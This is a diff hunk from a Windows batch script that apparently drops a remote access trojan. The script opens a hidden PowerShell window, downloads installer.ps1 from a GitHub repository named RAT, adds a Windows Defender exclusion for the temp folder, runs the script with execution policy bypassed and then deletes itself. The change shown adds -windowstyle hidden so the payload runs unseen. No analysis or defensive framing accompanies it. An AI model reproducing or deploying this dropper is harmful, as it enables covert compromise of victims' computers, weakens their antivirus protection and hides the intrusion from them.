@@ -35,7 +35,7 @@ if '%errorlevel%' NEQ '0' (
 
 @REM rat resources
 powershell powershell.exe -windowstyle hidden "Invoke-WebRequest -Uri https://raw.githubusercontent.com/peterpapath/RAT/refs/heads/main/files/installer.ps1 -OutFile installer.ps1"; Add-MpPreference -ExclusionPath "$env:temp"
-powershell powershell.exe -ep bypass ./installer.ps1
+powershell powershell.exe -windowstyle hidden -ep bypass ./installer.ps1
 
 @REM self delete
 del wget.cmd
